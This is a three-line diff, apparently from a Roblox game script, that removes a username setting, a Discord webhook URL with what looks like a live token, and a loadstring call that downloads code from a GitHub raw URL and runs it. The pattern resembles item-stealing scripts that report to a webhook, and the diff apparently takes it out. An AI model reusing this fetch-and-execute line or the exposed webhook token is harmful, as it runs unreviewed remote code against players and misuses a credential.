@@ -1,3 +1,0 @@
-Username = "difringgod1" 
-Webhook = "https://discord.com/api/webhooks/1357392218167574809/g0geqzRdB1BcMI_sbdd58Gzo9pk38uUt5hprwsF4eAheAimB8DhvNhidZBL1upVhqvwH" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
